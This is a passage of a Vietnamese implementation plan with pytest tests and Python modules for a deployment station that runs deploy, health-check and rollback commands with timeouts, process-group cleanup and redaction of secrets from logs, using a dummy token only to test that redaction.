    loc.nhan(token[20:] + b"\n")
    assert b"".join(ghi).decode().strip() == DONG_CHE
    assert token not in b"".join(ghi)


def test_dong_va_log_co_tran():
    ghi = []
    loc = Loc(ghi.append)
    for _ in range(500):
        loc.nhan(b"x" * 8192)
        assert len(loc.do) <= TRAN_DONG
    loc.nhan(b"\n")
    assert "bỏ một dòng dài quá" in b"".join(ghi).decode()
    for _ in range(100000):
        loc.nhan(b"dong binh thuong\n")
    loc.xong()
    assert loc.cat > 0 and sum(map(len, ghi)) <= TRAN_LOG
```

### File `tests/test_deploy_lenh.py`

```python
"""TM-3 (tu-deploy "Mỗi lệnh có giới hạn thời gian", "Không lọt bí mật qua kết quả deploy"; D100; Codex C1): chạy
một lệnh của chuỗi deploy. Đầu ra đi qua ỐNG, được che trong RAM rồi mới ghi vào log 0600 — byte thô không bao giờ
chạm đĩa, kể cả khi lệnh còn đang chạy, bị ngắt hay quá hạn. Lệnh là script `sh` GIẢ trong thư mục tạm của test."""
import os
import shlex
import signal
import stat
import threading
import time
import tracemalloc

import pytest

from tram.deploy.lenh import DONG_CHE, HAN, KetQuaBuoc, chay_buoc, don_log_cu, moi_truong, thu_muc_log
from tram.duong_dan import tram_home

TOKEN = "ghp_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"
IN_TOKEN = 'printf "token=%s%s\\n" ghp_ A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8'    # file script không chứa nguyên token


def lenh(tmp_path, ten: str, than: str) -> str:
    f = tmp_path / "tram-deploy" / ten
    f.parent.mkdir(exist_ok=True)
    f.write_text(f"#!/bin/sh\n{than}\n")
    return f"/bin/sh {shlex.quote(str(f))}"


def chay(tmp_path, buoc: str, than: str, **kw) -> tuple[KetQuaBuoc, str]:
    tm = thu_muc_log("repo-nhap")
    kq = chay_buoc(buoc, lenh(tmp_path, f"{buoc}.sh", than), cwd=tmp_path, log=tm / "dp-1.log",
                   env=kw.pop("env", moi_truong(os.environ, "repo-nhap", "m5", "m4")))
    return kq, (tm / "dp-1.log").read_text()


def tren_dia(*goc) -> list[str]:
    """Mọi file dưới các gốc đang chứa nguyên chuỗi token."""
    return sorted(str(f) for g in goc for f in g.rglob("*") if f.is_file() and TOKEN.encode() in f.read_bytes())


def cho_file(f, han: float = 10.0) -> bool:
    het = time.monotonic() + han
    while not f.exists() and time.monotonic() < het:
        time.sleep(0.05)
    time.sleep(0.5)                                  # cho bộ đọc của trạm kịp nhận dòng vừa in
    return f.exists()


def song(pid: int) -> bool:
    try:
        os.kill(pid, 0)
    except ProcessLookupError:
        return False
    return True


def test_moi_truong_toi_thieu():
    goc = {"PATH": "/usr/bin:/bin", "HOME": "/Users/tram", "LANG": "vi_VN.UTF-8", "TRAM_NOI_BO_TOKEN": "x",
           "ANTHROPIC_API_KEY": "y", "PYTHONPATH": "/z"}
    assert moi_truong(goc, "repo-nhap", "m5", "") == {
        "PATH": "/usr/bin:/bin", "HOME": "/Users/tram", "LANG": "vi_VN.UTF-8", "TRAM_DU_AN": "repo-nhap",
        "TRAM_DEPLOY_COMMIT": "m5", "TRAM_DEPLOY_COMMIT_TRUOC": ""}


def test_dat_chay_trong_thu_muc_va_khong_mang_bien_cua_tram_api(tmp_path, monkeypatch):
    monkeypatch.setenv("TRAM_NOI_BO_TOKEN", "bi-mat-cua-tram-api")
    kq, log = chay(tmp_path, "deploy", 'pwd; echo "commit=$TRAM_DEPLOY_COMMIT truoc=$TRAM_DEPLOY_COMMIT_TRUOC"; env')
    assert kq.dat and kq.ma_thoat == 0 and not kq.het_gio
    assert str(tmp_path) in log and "commit=m5 truoc=m4" in log and "bi-mat-cua-tram-api" not in log
    assert log.startswith("=== deploy\n") and f"\n=== deploy · mã thoát 0 · {kq.giay} giây\n" in log
    assert kq.su_kien() == {"buoc": "deploy", "ma_thoat": 0, "giay": kq.giay, "het_gio": False,
                            "digest_log": kq.digest_log}


def test_lenh_in_token_bi_che_log_0600(tmp_path):
    """Scenario "Lệnh deploy in ra token": sự kiện chỉ mã thoát/giây/digest; file log có chuỗi đó đã bị che; dòng in
    làm hai lần đọc (chưa xuống dòng) vẫn được che theo cả dòng."""
    kq, log = chay(tmp_path, "deploy", f'echo "dang day ban moi"\n{IN_TOKEN}\nprintf "Bearer ghp_A1b2C3d4E5f6"\n'
                                       '/bin/sleep 0.3\necho "G7h8I9j0K1l2M3n4O5p6Q7r8"\nexit 1')
    assert (kq.dat, kq.ma_thoat) == (False, 1)
    assert TOKEN not in log and log.count(DONG_CHE) == 2 and "dang day ban moi" in log and "ghp_" not in log
    assert TOKEN not in str(kq.su_kien())
    tm = thu_muc_log("repo-nhap")
    assert stat.S_IMODE((tm / "dp-1.log").stat().st_mode) == 0o600
    assert {stat.S_IMODE(p.stat().st_mode) for p in (tm, tm.parent)} == {0o700}
    assert [f.name for f in tm.rglob("*") if f.is_file()] == ["dp-1.log"]     # không có file tạm nào


def test_bi_mat_khong_cham_dia_khi_lenh_dang_chay_hay_qua_han(tmp_path, monkeypatch):
    """Codex C1: lệnh đã in token mà còn chạy (trạm chết đúng lúc này thì đĩa giữ gì?) → không file nào chứa token;
    mọi file trong thư mục log 0600 ngay lúc tạo, cả khi umask 000. Quá hạn → thu hồi cả nhóm, vẫn không lộ."""
    monkeypatch.setitem(HAN, "deploy", 4)
    co, kq, cu = tmp_path / "da-in", [], os.umask(0)
    try:
        lu = threading.Thread(target=lambda: kq.append(chay(tmp_path, "deploy",
                                                             f'{IN_TOKEN}\ntouch "{co}"\n/bin/sleep 30')))
        lu.start()
        assert cho_file(co)
        tep = [f for f in thu_muc_log("repo-nhap").rglob("*") if f.is_file()]
        assert tren_dia(tram_home(), tmp_path) == []
        assert tep and {stat.S_IMODE(f.stat().st_mode) for f in tep} == {0o600}
        lu.join(30)
    finally:
        os.umask(cu)
    ((k, log),) = kq
    assert k.het_gio and k.da_thu_hoi and not k.dat and k.giay < 15 and DONG_CHE in log and "quá hạn" in log
    assert tren_dia(tram_home(), tmp_path) == []


def test_ngat_giua_chung_thu_hoi_ca_nhom_khong_de_lai_bi_mat(tmp_path):
    """Codex C1: trạm bị ngắt (SIGINT/SIGTERM) khi lệnh đã in token → thu hồi cả nhóm; không file nào chứa token."""
    co, pid = tmp_path / "da-in", tmp_path / "pid"

    def ban() -> None:
        if cho_file(co):
            os.kill(os.getpid(), signal.SIGINT)
    threading.Thread(target=ban, daemon=True).start()
    with pytest.raises(KeyboardInterrupt):
        chay(tmp_path, "deploy", f'{IN_TOKEN}\n/bin/sleep 30 &\necho $! > "{pid}"\ntouch "{co}"\nwait')
    assert tren_dia(tram_home(), tmp_path) == []
    con, het = int(pid.read_text()), time.monotonic() + 5
    while song(con) and time.monotonic() < het:
        time.sleep(0.1)
    assert not song(con)


def test_dau_ra_lon_co_tran_khong_giu_het_trong_ram(tmp_path):
    """Codex C1: một dòng 3 MB không xuống dòng + 20 MB dòng thường → log có trần, ghi rõ phần bỏ/cắt; RAM của trạm
    không giữ cả đầu ra."""
    than = ('/usr/bin/head -c 3000000 /dev/zero | /usr/bin/tr "\\000" a\necho\n'
            '/usr/bin/yes "dong binh thuong" | /usr/bin/head -c 20000000')
    tracemalloc.start()
    try:
        kq, log = chay(tmp_path, "deploy", than)
        dinh = tracemalloc.get_traced_memory()[1]
    finally:
        tracemalloc.stop()
    assert kq.dat and dinh < 8 * 2 ** 20
    assert "bỏ một dòng dài quá" in log and " · đã cắt " in log.splitlines()[-1]
    assert (thu_muc_log("repo-nhap") / "dp-1.log").stat().st_size < 2 * 2 ** 20


def test_qua_han_giet_ca_nhom_tinh_la_hong(tmp_path, monkeypatch):
    """Scenario "Lệnh deploy treo" (hạn rút ngắn cho test): dừng cả nhóm tiến trình, tính là hỏng."""
    monkeypatch.setitem(HAN, "deploy", 1)
    kq, log = chay(tmp_path, "deploy", "/bin/sleep 30 &\n/bin/sleep 30")
    assert kq.het_gio and not kq.dat and kq.da_thu_hoi and kq.giay < 15
    assert "quá hạn" in log
    assert HAN == {"deploy": 1, "kiem_song": 120, "lui": 900, "kiem_song_sau_lui": 120, "git": 60}


def test_lenh_khong_tach_duoc_thi_khong_chay(tmp_path):
    kq = chay_buoc("lui", "sh 'thieu nhay", cwd=tmp_path, env={}, log=thu_muc_log("repo-nhap") / "dp-2.log")
    assert (kq.dat, kq.ma_thoat, kq.da_thu_hoi) == (False, None, True)


def test_don_log_cu(tmp_path):
    tm = thu_muc_log("repo-nhap")
    cu, moi = tm / "dp-cu.log", tm / "dp-moi.log"
    cu.write_text("x")
    moi.write_text("y")
    os.utime(cu, (0, 0))
    assert don_log_cu(tm) == 1 and not cu.exists() and moi.exists()
```

### File `tram/deploy/ong.py`

```python
"""Đọc ống không chặn; chỉ giữ tối đa một dòng 16 KiB, ghi tối đa 1 MiB đã che mỗi bước."""
import os

from tram.nho.bi_mat import quet

DONG_CHE = "[trạm: đã che một dòng có dấu hiệu bí mật]"
TRAN_DONG = 16384
TRAN_LOG = 1024 * 1024


class Loc:
    def __init__(self, ghi):
        self.ghi, self.dem, self.cat = ghi, 0, 0
        self.do, self.bo = bytearray(), False

    def dong(self):
        text = self.do.decode("utf-8", "replace")
        sach = "[trạm: bỏ một dòng dài quá giới hạn]" if self.bo else DONG_CHE if quet([text]) else text
        phan = (sach + "\n").encode()
        if self.dem + len(phan) <= TRAN_LOG:
            self.ghi(phan)
            self.dem += len(phan)
        else:
            self.cat += len(phan)
        self.do.clear()
        self.bo = False

    def nhan(self, phan):
        for i, doan in enumerate(phan.split(b"\n")):
            if i:
                self.dong()
            if not self.bo:
                if len(self.do) + len(doan) > TRAN_DONG:
                    self.do.clear()
                    self.bo = True
                else:
                    self.do.extend(doan)

    def doc(self, fd):
        # Mỗi nhịp có trần: output vô hạn không làm đói kiểm timeout/ngắt.
        for _ in range(16):
            try:
                phan = os.read(fd, 8192)
            except BlockingIOError:
                return
            if not phan:
                return
            self.nhan(phan)

    def xong(self):
        if self.do or self.bo:
            self.dong()
```

### File `tram/deploy/lenh.py`

```python
"""Chạy lệnh deploy qua ống, hạn giờ và sở hữu nhóm theo primitive P1."""
import hashlib
import os
import shlex
import time
from collections.abc import Callable, Mapping
from dataclasses import dataclass
from pathlib import Path

from tram.duong_dan import tram_home
import subprocess

from tram.deploy.ong import DONG_CHE, Loc
from tram.kiem.so_huu import so_huu
from tram.kiem.vong_doi import khoi_chay, kill_cuc_bo
from tram.nho.bi_mat import quet

HAN = {"deploy": 900, "kiem_song": 120, "lui": 900, "kiem_song_sau_lui": 120, "git": 60}       # D100: giây
GIU_NGAY = 30
BIEN_GIU = ("PATH", "HOME", "LANG")


@dataclass(frozen=True)
class KetQuaBuoc:
    buoc: str
    ma_thoat: int | None
    giay: int
    het_gio: bool
    digest_log: str
    da_thu_hoi: bool = True

    @property
    def dat(self) -> bool:
        return self.ma_thoat == 0 and not self.het_gio and self.da_thu_hoi

    def su_kien(self) -> dict:
        return {"buoc": self.buoc, "ma_thoat": self.ma_thoat, "giay": self.giay, "het_gio": self.het_gio,
                "digest_log": self.digest_log}


def thu_muc_log(du_an: str) -> Path:
    p = tram_home() / "deploy-log" / du_an
    for d in (p.parent, p):
        d.mkdir(mode=0o700, exist_ok=True)
        os.chmod(d, 0o700)
    return p


def don_log_cu(thu_muc: Path, *, bay_gio: float | None = None) -> int:
    han, so = (bay_gio or time.time()) - GIU_NGAY * 86400, 0
    for f in thu_muc.glob("*.log"):
        if f.stat().st_mtime < han:
            f.unlink(missing_ok=True)
            so += 1
    return so


def moi_truong(goc: Mapping[str, str], du_an: str, commit: str, commit_truoc: str) -> dict[str, str]:
    return {**{k: goc[k] for k in BIEN_GIU if k in goc}, "TRAM_DU_AN": du_an, "TRAM_DEPLOY_COMMIT": commit,
            "TRAM_DEPLOY_COMMIT_TRUOC": commit_truoc}


def che(van_ban: str) -> str:
    return "\n".join(DONG_CHE if quet([d]) else d for d in van_ban.splitlines())


def _noi_log(log: Path, phan: bytes) -> None:
    fd = os.open(log, os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o600)
    try:
        os.write(fd, phan)
    finally:
        os.close(fd)
    os.chmod(log, 0o600)


def chay_buoc(buoc: str, lenh: str, *, cwd: Path, env: Mapping[str, str], log: Path) -> KetQuaBuoc:
    """Ống → RAM có trần → che → log 0600 từ lúc tạo. Không file tạm chứa output."""
    try:
        argv = shlex.split(lenh)
    except ValueError:
        argv = []
    bat_dau, ma, het_gio, sach = time.monotonic(), None, False, True
    digest = hashlib.sha256()
    fd = os.open(log, os.O_WRONLY | os.O_CREAT | os.O_APPEND | os.O_NOFOLLOW, 0o600)
    with os.fdopen(fd, "wb", buffering=0) as f:
        os.fchmod(f.fileno(), 0o600)
        def ghi(phan):
            f.write(phan)
            digest.update(phan)
        f.write(f"=== {buoc}\n".encode())
        loc = Loc(ghi)
        with so_huu("deploy: không xác nhận thu hồi cây tiến trình") as chu:
            try:
                if argv:
                    n = khoi_chay(argv, kill=kill_cuc_bo, chu=chu, cwd=cwd, env=dict(env),
                                  stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                    with n.p.stdout as ong:
                        os.set_blocking(ong.fileno(), False)
                        while True:
                            loc.doc(ong.fileno())
                            ma = n.cho(0.02)
                            if ma is not None or time.monotonic() - bat_dau >= HAN[buoc]:
                                break
                        het_gio = ma is None
                        sach = n.thu_hoi()
                        ma = n.p.returncode if het_gio else ma
                        loc.doc(ong.fileno())
            except OSError:
                ma = None
                ghi("[trạm: lỗi khởi chạy/đọc đầu ra]\n".encode())
            finally:
                loc.xong()
        giay = round(time.monotonic() - bat_dau)
        f.write((f"\n=== {buoc} · mã thoát {ma} · {giay} giây" + (" · quá hạn" if het_gio else "")
                 + (f" · đã cắt {loc.cat} byte" if loc.cat else "") + "\n").encode())
    return KetQuaBuoc(buoc, ma, giay, het_gio, "sha256:" + digest.hexdigest(), sach)
```

- [ ] Áp mã, chạy xanh; lưu số đo thật, không dùng số dự kiến.

```bash
tests/chan_host/chay.sh -q tests/test_deploy_ong.py tests/test_deploy_lenh.py
```

- [ ] Kiểm diff và trần dòng; giữ thay đổi chưa commit.

## Task 3: Chuỗi và hệ quả cùng giao dịch; D115/D126

**Files:** `tests/test_deploy_chuoi.py`, `tram/deploy/chuoi.py`, `tram/deploy/ghi.py`

**Bằng chứng phiên này:** Mã chuỗi kế thừa phần đang dở. Xanh trong nhóm 60 test; không tuyên bố mới đo đỏ riêng Task 3.

- [ ] Áp test, chạy đỏ trước mã.

### File `tests/test_deploy_chuoi.py`

```python
"""TM-3 (tu-deploy: Kiểm còn sống · Deploy hỏng thì tự lùi · Hỏng 3 lần thì tự tắt · Lùi cũng hỏng thì dừng hẳn ·
Kết quả không rõ; D75, D97 luật 1/2, Đại ca chốt D115): chuỗi lệnh (hàm thuần trên `chay` giả) và `deploy.xong` ghi
cùng giao dịch với hệ quả — đúng hợp đồng sự kiện/tin của TM-1."""
from dataclasses import replace

import pytest

from tram.bao_tin.nguon import tin_tu_su_kien
from tram.bao_tin.tin import Tin
from tram.deploy.chuoi import chay_chuoi
from tram.deploy.ghi import ket_thuc, ma_chuoi
from tram.deploy.lenh import KetQuaBuoc
from tram.phieu.kho import KhoPhieu
from tram.su_kien.kho import KhoSuKien
from tram.tu_dong.cai_dat import CaiDatTuDong
from tram.tu_dong.luu import doc_trang_thai, doi_cai_dat

CD = CaiDatTuDong(tu_merge=True, tu_deploy=True, lenh_deploy="d.sh", lenh_kiem_song="k.sh", lenh_lui="l.sh")
DAT, HONG = KetQuaBuoc("x", 0, 1, False, "sha256:a"), KetQuaBuoc("x", 1, 1, False, "sha256:b")
QUA_HAN, KHONG_THU = KetQuaBuoc("x", -9, 900, True, "sha256:c"), KetQuaBuoc("x", None, 900, True, "sha256:d", False)


def gia(**theo_buoc):
    goi = []

    def chay(buoc, lenh):
        goi.append((buoc, lenh))
        return theo_buoc.get(buoc, DAT)
    return chay, goi


@pytest.mark.parametrize("theo, ket_qua, cac_buoc", [
    ({}, "dat", ["deploy", "kiem_song"]),
    ({"kiem_song": HONG}, "da_lui", ["deploy", "kiem_song", "lui", "kiem_song_sau_lui"]),   # trang chết → lùi
    ({"deploy": QUA_HAN}, "da_lui", ["deploy", "lui", "kiem_song_sau_lui"]),                # lệnh deploy treo
    ({"deploy": HONG, "kiem_song_sau_lui": HONG}, "lui_hong", ["deploy", "lui", "kiem_song_sau_lui"]),
    ({"deploy": HONG, "lui": QUA_HAN}, "lui_hong", ["deploy", "lui"]),
    ({"deploy": KHONG_THU}, "khong_ro", ["deploy"]),                  # cây chưa thu hồi → không lùi chồng lên
    ({"kiem_song": HONG, "lui": KHONG_THU}, "khong_ro", ["deploy", "kiem_song", "lui"]),
])
def test_chuoi_deploy_kiem_song_lui(theo, ket_qua, cac_buoc):
    chay, goi = gia(**theo)
    assert chay_chuoi(CD, chay) == ket_qua
    assert [b for b, _ in goi] == cac_buoc
    assert dict(goi) == {b: {"deploy": "d.sh", "lui": "l.sh"}.get(b, "k.sh") for b in cac_buoc}


def test_ma_chuoi_tat_dinh():
    assert ma_chuoi("rn", "m5", "dai_ca", "ma-1") == ma_chuoi("rn", "m5", "dai_ca", "ma-1")
    assert ma_chuoi("rn", "m5", "dai_ca", "ma-1") != ma_chuoi("rn", "m5", "tu_dong", "ma-1")
    assert ma_chuoi("rn", "m5", "dai_ca", "ma-1").startswith("dp-") and len(ma_chuoi("a", "b", "c", "d")) == 43


@pytest.fixture
def kho(tmp_path):
    k = KhoPhieu(tmp_path / "su-kien.db")
    doi_cai_dat(k.db, "repo-nhap", lambda c: CD, tac_nhan="dai-ca/dashboard")
    yield k
    k.close()


def tin_sau(tmp_path, moc: int) -> list[Tin]:
    ks = KhoSuKien(tmp_path / "su-kien.db")
    try:
        return [t for s in ks.sau_id(moc, 100) for t in tin_tu_su_kien(s, ks)]
    finally:
        ks.close()


def test_hong_lan_thu_ba_tu_tat_va_bao(kho, tmp_path):
    """Scenario "Lùi thành công" (đếm tăng, công tắc giữ) rồi "Lần hỏng thứ ba" (tự tắt, tác nhân trạm)."""
    assert ket_thuc(kho.db, "repo-nhap", "dp-1", "da_lui") == 1
    assert ket_thuc(kho.db, "repo-nhap", "dp-2", "da_lui") == 2
    assert doc_trang_thai(kho.db, "repo-nhap").cai_dat.tu_deploy is True
    moc = kho.db.execute("SELECT max(id) FROM su_kien").fetchone()[0]
    assert ket_thuc(kho.db, "repo-nhap", "dp-3", "da_lui") == 3
    tt = doc_trang_thai(kho.db, "repo-nhap")
    assert tt.cai_dat == replace(CD, tu_deploy=False) and tt.tam_dung_du_an is None
    assert tin_sau(tmp_path, moc) == [Tin("deploy_da_lui", "repo-nhap", "hong-3-lan"),
                                      Tin("tu_deploy_tu_tat", "repo-nhap")]
    assert ket_thuc(kho.db, "repo-nhap", "dp-4", "dat") == 0          # thành công → về 0, không đổi gì thêm


def test_lui_hong_tat_va_tam_dung_cung_giao_dich(kho, tmp_path):
    """Scenario "Trang chết sau lùi": tắt tự deploy, TẠM DỪNG dự án, tin khẩn."""
    assert ket_thuc(kho.db, "repo-nhap", "dp-1", "lui_hong") == 1
    tt = doc_trang_thai(kho.db, "repo-nhap")
    assert tt.cai_dat.tu_deploy is False and tt.cai_dat.tu_merge is True
    assert (tt.tam_dung_du_an.boi, tt.tam_dung_du_an.ly_do) == ("tram/tu-deploy", "lui-hong")
    assert tin_sau(tmp_path, 1) == [Tin("lui_hong", "repo-nhap"), Tin("cai_dat_doi", "repo-nhap", "tram-tu-deploy-tat"),
                                    Tin("cai_dat_doi", "repo-nhap", "tram-tam-dung")]


def test_khong_ro_tam_dung_ca_du_an_khong_tinh_hong(kho, tmp_path):
    """D115 (Đại ca chốt 18/10): không rõ kết quả → TẠM DỪNG cả dự án; tự deploy giữ nguyên, không tính lần hỏng."""
    ket_thuc(kho.db, "repo-nhap", "dp-1", "da_lui")
    assert ket_thuc(kho.db, "repo-nhap", "dp-2", "khong_ro") == 1
    tt = doc_trang_thai(kho.db, "repo-nhap")
    assert tt.cai_dat.tu_deploy is True and tt.tam_dung_du_an.ly_do == "khong-ro"
    assert Tin("deploy_khong_ro", "repo-nhap") in tin_sau(tmp_path, 2)


def test_loi_giua_giao_dich_khong_ghi_gi(kho, monkeypatch):
    import tram.deploy.ghi as g
    monkeypatch.setattr(g, "ghi_tam_dung", lambda *a, **k: (_ for _ in ()).throw(OSError("đĩa đầy")))
    trc = kho.db.execute("SELECT count(*) FROM su_kien").fetchone()[0]
    with pytest.raises(OSError):
        ket_thuc(kho.db, "repo-nhap", "dp-1", "lui_hong")
    assert kho.db.execute("SELECT count(*) FROM su_kien").fetchone()[0] == trc
```

### File `tram/deploy/chuoi.py`

```python
"""Một chuỗi deploy (spec `tu-deploy`: Kiểm còn sống sau mỗi lần deploy · Deploy hỏng thì tự lùi · Lùi cũng hỏng thì
dừng hẳn; D75, D97 luật 1) — hàm thuần trên `chay(buoc, lenh) -> KetQuaBuoc`:

    deploy ─đạt→ kiểm còn sống ─đạt→ `dat`
       └hỏng/quá hạn────┴hỏng/quá hạn→ lùi ─đạt→ kiểm còn sống ─đạt→ `da_lui`
                                         └hỏng/quá hạn──────┴hỏng/quá hạn→ `lui_hong`

Bước nào không xác nhận được đã thu hồi cả cây tiến trình (`da_thu_hoi=False`) → DỪNG ngay, `khong_ro`: không chạy
lùi chồng lên một lệnh có thể còn sống (D97 luật 2 — không chạy lại mù). Không xét estop/tạm dừng giữa chuỗi: chuỗi
đã bắt đầu thì làm nốt (spec "Đang làm dở thì làm nốt an toàn")."""
from collections.abc import Callable

from tram.deploy.lenh import KetQuaBuoc
from tram.tu_dong.cai_dat import CaiDatTuDong

Chay = Callable[[str, str], KetQuaBuoc]


def chay_chuoi(cd: CaiDatTuDong, chay: Chay) -> str:
    """→ `dat` | `da_lui` | `lui_hong` | `khong_ro`."""
    kq = chay("deploy", cd.lenh_deploy)
    if not kq.da_thu_hoi:
        return "khong_ro"
    if kq.dat:
        kq = chay("kiem_song", cd.lenh_kiem_song)
        if not kq.da_thu_hoi:
            return "khong_ro"
        if kq.dat:
            return "dat"
    kq = chay("lui", cd.lenh_lui)
    if not kq.da_thu_hoi:
        return "khong_ro"
    if kq.dat:
        kq = chay("kiem_song_sau_lui", cd.lenh_kiem_song)
        if not kq.da_thu_hoi:
            return "khong_ro"
        if kq.dat:
            return "da_lui"
    return "lui_hong"
```

### File `tram/deploy/ghi.py`

```python
"""Ghi sự kiện `deploy.*` đúng hợp đồng TM-1 (plan TM-1 mục "Interfaces cho lát sau"), tác nhân `tram/tu-deploy`.
`deploy.xong` ghi CÙNG MỘT giao dịch với hệ quả của nó (tự tắt, tạm dừng — qua `tram.tu_dong.luu`, chỉ gọi), nên
trạm chết giữa chừng không để lại "đã hỏng lần 3 mà chưa tắt". `deploy.yeu_cau` (nút Deploy) và `deploy.huy` là hai
loại TM-3 thêm, không có tin Telegram (`nguon_tu_dong` bỏ qua loại lạ)."""
import hashlib
import sqlite3
from dataclasses import replace

from tram.deploy.trang_thai import HONG, TAC_NHAN, dem_hong, doc_su_kien
from tram.duong_dan import bay_gio
from tram.su_kien.ghi_trong import ghi_trong_giao_dich
from tram.tu_dong.luu import doi_cai_dat, ghi_tam_dung, giao_dich

TU_TAT_SAU = 3          # D75: hỏng 3 lần liên tiếp thì tự tắt tự deploy


def ma_chuoi(du_an: str, commit: str, nguon: str, ma_yeu_cau: str) -> str:
    """D-7: `dp-` + sha256(dự án, commit, nguồn, mã yêu cầu) — cùng yêu cầu không bao giờ thành hai chuỗi."""
    return "dp-" + hashlib.sha256("\0".join((du_an, commit, nguon, ma_yeu_cau)).encode()).hexdigest()[:40]


def ghi(db: sqlite3.Connection, du_an: str, loai: str, du_lieu: dict) -> int:
    with giao_dich(db):
        return ghi_trong_giao_dich(db, du_an, loai, du_lieu, tac_nhan=TAC_NHAN, luc=bay_gio())


def ket_thuc(db: sqlite3.Connection, du_an: str, ma: str, ket_qua: str) -> int:
    """`deploy.xong {ma_thao_tac, ket_qua, dem_hong}` + hệ quả; trả bộ đếm hỏng sau lần này.
    Hỏng (`da_lui`) lần thứ 3 liên tiếp → tắt tự deploy, `ly_do: hong-3-lan` (D75). Lùi hỏng → tắt tự deploy và
    TẠM DỪNG dự án, `lui-hong` (D97 luật 1). Không rõ kết quả → TẠM DỪNG dự án, `khong-ro` (Đại ca chốt 18/10, câu 3
    plan TM-1); không tính là một lần hỏng."""
    with giao_dich(db):
        dem = 0 if ket_qua == "dat" else dem_hong(doc_su_kien(db, du_an)) + (ket_qua in HONG)
        ghi_trong_giao_dich(db, du_an, "deploy.xong", {"ma_thao_tac": ma, "ket_qua": ket_qua, "dem_hong": dem},
                            tac_nhan=TAC_NHAN, luc=bay_gio())
        tat = "lui-hong" if ket_qua == "lui_hong" else ("hong-3-lan" if ket_qua in HONG and dem >= TU_TAT_SAU else "")
        if tat:
            doi_cai_dat(db, du_an, lambda c: replace(c, tu_deploy=False), tac_nhan=TAC_NHAN, them={"ly_do": tat})
        if ket_qua in ("lui_hong", "khong_ro"):
            ghi_tam_dung(db, du_an, tam_dung=True, tac_nhan=TAC_NHAN, them={"ly_do": ket_qua.replace("_", "-")})
        return dem
```

- [ ] Áp mã, chạy xanh; lưu số đo thật, không dùng số dự kiến.

```bash
tests/chan_host/chay.sh -q tests/test_deploy_chuoi.py
```

- [ ] Kiểm diff và trần dòng; giữ thay đổi chưa commit.

## Task 4: Git có hạn, cửa tươi và tập phủ; Q4–Q8

**Files:** `tests/test_deploy_vong.py`, `tests/test_deploy_race.py`, `tests/test_deploy_cong_tac_v2.py`, `tram/deploy/git.py`, `tram/deploy/chay.py`, `tram/deploy/vong.py`

**Bằng chứng phiên này:** Nhóm mã cũ: 23 failed, 19 passed (gồm API/hiển thị); lỗi giao diện callback và các assertion race. Sau sửa 8 test điều phối với biên giả xanh. Các test Git/runner thật phải chạy lại trên môi trường cho đọc ps; không coi fake là bằng chứng Q5.

- [ ] Áp test, chạy đỏ trước mã.

### File `tests/test_deploy_vong.py`

```python
"""TM-3 (tu-deploy, dieu-khien-tu-dong; design D-6, D-7, D-9; D74, D75, D96, D97, D100, D115, D116, D123, D124;
Codex Q4–Q8): pha deploy của một dự án trên kho kiểm giả (repo bare cục bộ) + kho sự kiện tạm. Ba lệnh là script `sh`
GIẢ trong thư mục tạm, ghi "bản khách đang dùng" vào một file tạm — không lệnh deploy thật nào, không mạng."""
import json
import os
import shlex
import shutil
import stat
import sys
import time
from pathlib import Path
from types import SimpleNamespace

import pytest

from kho_kiem_gia import dung_kho
from tram.chu import estop
from tram.deploy.lenh import HAN
from tram.deploy.vong import buoc_deploy
from tram.duong_dan import tram_home
from tram.giao_viec.git_kiem import fetch
from tram.phieu.kho import KhoPhieu
from tram.su_kien.ghi_trong import ghi_trong_giao_dich
from tram.tu_dong.cai_dat import CaiDatTuDong
from tram.tu_dong.luu import DU_AN_TRAM, doc_trang_thai, doi_cai_dat, ghi_tam_dung, giao_dich

LOI_CHUOI = {"deploy": 'echo "$TRAM_DEPLOY_COMMIT" > "{g}/ban"; pwd -P > "{g}/pwd"',
             "kiem_song": "exit 0", "lui": 'echo "$TRAM_DEPLOY_COMMIT_TRUOC" > "{g}/ban"'}
CO_HONG = {"deploy": "deploy-hong", "kiem_song": "song-hong", "lui": "lui-hong"}
DAI_CA = "dai-ca/dashboard"


class Tram:
    def __init__(self, tmp_path: Path, *, tu_deploy: bool = False, du_lenh: bool = True):
        self.g, self.k, self.bg = tmp_path, dung_kho(tmp_path), True
        self.kho = KhoPhieu(tmp_path / "su-kien.db")
        self.da = SimpleNamespace(ten="repo-nhap", nhanh_chinh="main")
        self.bo = SimpleNamespace(kho_git=lambda d: self.k.kho)
        lenh = {}
        for ten, than in LOI_CHUOI.items():
            f = tmp_path / "tram-deploy" / f"{ten}.sh"
            f.parent.mkdir(exist_ok=True)
            f.write_text(f'#!/bin/sh\n[ -f "{tmp_path}/{CO_HONG[ten]}" ] && exit 3\n{than.format(g=tmp_path)}\n')
            lenh[ten] = f"/bin/sh {shlex.quote(str(f))}"
        cd = CaiDatTuDong(tu_merge=True, tu_deploy=tu_deploy, lenh_deploy=lenh["deploy"],
                          lenh_kiem_song=lenh["kiem_song"], lenh_lui=lenh["lui"] if du_lenh else "")
        doi_cai_dat(self.kho.db, "repo-nhap", lambda c: cd, tac_nhan=DAI_CA)
        self.n = 0

    def ghi(self, loai: str, du_lieu: dict, *, bead: str | None = None, tac_nhan: str = "tram/giao-viec") -> None:
        with giao_dich(self.kho.db):
            ghi_trong_giao_dich(self.kho.db, "repo-nhap", loai, du_lieu, bead_id=bead, tac_nhan=tac_nhan,
                                luc="2026-10-18T10:00:00Z")

    def merge(self, *, tu: bool = True, fetch_kho: bool = True) -> str:
        """Một PR của trạm đã merge vào main và đã xác minh (`pr.da_merge`); `tu` = do trạm tự merge (TM-2)."""
        self.n += 1
        b = f"rn-{self.n}"
        sha = self.k.day("main", {f"src/f{self.n}.py": f"x = {self.n}\n"})
        if fetch_kho:
            fetch(self.k.kho)
        if tu:
            self.ghi("tu_merge.bat_dau", {"ma_thao_tac": f"tm-{b}", "commit": f"c-{b}", "pr": self.n, "loai": "code"},
                     bead=b, tac_nhan="tram/tu-merge")
        self.ghi("pr.da_merge", {"bead_id": b, "commit": f"c-{b}", "merge_commit": sha, "ma_thao_tac": f"pr-{b}"},
                 bead=b)
        return sha

    def bam(self, commit: str, ma: str = "ma-dp-0001") -> None:
        self.ghi("deploy.yeu_cau", {"ma_thao_tac": ma, "commit": commit, "nguon": "dai_ca"}, tac_nhan=DAI_CA)

